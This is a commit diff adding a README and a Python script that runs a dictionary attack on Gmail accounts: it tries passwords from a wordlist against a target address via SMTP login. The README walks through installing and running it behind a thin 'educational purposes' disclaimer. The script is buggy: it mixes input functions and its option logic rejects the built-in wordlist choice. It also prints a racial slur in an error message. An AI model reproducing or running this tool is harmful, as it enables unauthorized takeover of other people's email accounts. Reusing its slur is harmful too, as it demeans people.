c62d3b7e6871d9b0df78de64c5a0203db1c73c82
DaRkSurface <74876947+DaRkSurface@users.noreply.github.com>
2020-11-22 22:12:43 +0100

    Add files via upload

---
+++ README.md
@@ -0,0 +1,40 @@
+#README.md
+# This Script is only for educational purposes to show you how these attacks are done. 
+# Do NOT use this in a malicious way to others without explicit concent!
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Quick notes:
+this is purely for linux dist users, I do not recommend using this in any other OS like windows or Mac because of its file system and its inbuilt files!
+
+This Attacker is not at all recommended now because of gmails rate limit on login attempts. Use this attacker only if you maybe have 5 - 40 passwords which you know that one of them is correct. 
+
+How to install:
+firstly if you do not have git install it
+
+in the terminal do:
+cd PathOfYourLikingWhereYouWantToStoreTheFile
+i often do:
+cd Desktop
+
+then do:
+git clone https://github.com/DaRkSurface/gmaildictionaryattack.git
+
+
+Installed!
+
+How to open:
+cd PathWhereGmailAttackIsLocated
+
+then do:
+ls
+This is optional this is only if you have changed the name of the .py or if you want to see all the files.
+
+then do:
+cat README.md
+
+If you dont have python 3.x installed then install it!
+
+then do: python gmailattack.py
+
+DONE!
+
+DaRk
---
+++ gmailattack.py
@@ -0,0 +1,42 @@
+import smtplib
+from os import system
+
+def logo():
+    print(" ________               .__.__  ________  .__          _____   __    __                 __      ")
+    print(" /  _____/  _____ _____  |__|  | \______ \ |__| ____   /  _  \_/  |__/  |______    ____ |  | __ ")
+    print("/   \  ___ /     \\__  \ |  |  |  |    |  \|  |/ ___\ /  /_\  \   __\   __\__  \ _/ ___\|  |/ / ")
+    print("\    \_\  \  Y Y  \/ __ \|  |  |__|    `   \  \  \___/    |    \  |  |  |  / __ \\  \___|    <  ")
+    print(" \______  /__|_|  (____  /__|____/_______  /__|\___  >____|__  /__|  |__| (____  /\___  >__|_ \ ")
+    print("        \/      \/     \/                \/        \/        \/                \/     \/     \/ ")
+    print("}--------------- coded by DaRk ---------------{")
+
+logo()
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = raw_input("Enter Target (Gmail Adress): ")
+
+pwd = input("Enter 0 if you want to use the inbuilt basic wordlist of passwords, enter 1 if you want to use your own:")
+
+if pwd == "0":
+    passswfile="inbuiltpasslist.txt"
+
+if pwd == "1":
+    passswfile = input("Path of your passlist: ")
+else:
+    print("Nigga you did not enter 0 or 1")
+    quit()
+
+passswfile = open(passswfile, "r")
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[-] Pasword Is Wrong. %s " % password)
